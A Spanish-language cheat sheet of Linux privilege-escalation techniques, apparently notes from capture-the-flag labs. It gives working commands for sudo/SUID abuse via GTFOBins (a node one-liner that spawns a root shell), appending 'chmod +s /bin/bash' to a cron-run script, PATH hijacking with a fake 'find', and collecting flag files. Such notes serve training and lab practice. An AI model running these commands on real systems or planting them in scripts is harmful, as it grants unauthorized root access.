# Escalada de privilegios Linux

Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO** y **BOLA**.

## 1. Punto de partida: enumeración

```
id
hostname
uname -a
cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null      # binarios con SUID
ls -la /opt /var/backups /tmp
```

`sudo -l` es lo primero: lista qué binarios puedes ejecutar sin contraseña.

## 2. GTFOBins (abuso de binarios con sudo/SUID)

Buscar el binario en [https://gtfobins.github.io](https://gtfobins.github.io) y copiar el comando. Ejemplos usados en el repo:

**node:**

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

**crash (SUID):**

```
sudo /usr/bin/crash -h
```

**most (lectura de archivos como root):**

```
sudo -u root /usr/bin/most /root/root.txt
```

Dentro de `most` se lanza un shell con `!` y se sale con `q`.

## 3. Shell SUID en bash

```
echo "chmod +s /bin/bash" >> /opt/backup.sh
chmod +x /opt/backup.sh
```

Esperar a que el cron ejecute el script y comprobar:

```
ls -l /bin/bash
/bin/bash -p
```

- `-p` → mantiene los privilegios efectivos aunque el binario sea SUID.

## 4. Vigilar procesos con pspy

Muestra los procesos de otros usuarios (cron, systemd) sin necesidad de root:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

Útil para descubrir un script periódico escribible.

## 5. Hijack del PATH

Si un script de `sudo` ejecuta un binario sin ruta absoluta (`find`, `ls`...), creamos uno falso en un directorio que controlamos:

```
echo "/bin/bash" > find
chmod 777 find
echo $PATH
```

Y ejecutamos el script forzando el PATH:

```
sudo PATH=/ruta/controlada:$PATH /ruta/controlada/script.sh
```

## 6. Bases de datos locales

```
mysql -u <usuario> -p -h localhost <basededatos>
mariadb -u <usuario> -p
```

Dentro del cliente SQL:

```
show databases;
use <basededatos>;
show tables;
select * from <tabla>;
```

## 7. Recoger las banderas

```
cat user.txt
cat root.txt
find / -name "user.txt" -o -name "root.txt" 2>/dev/null
```
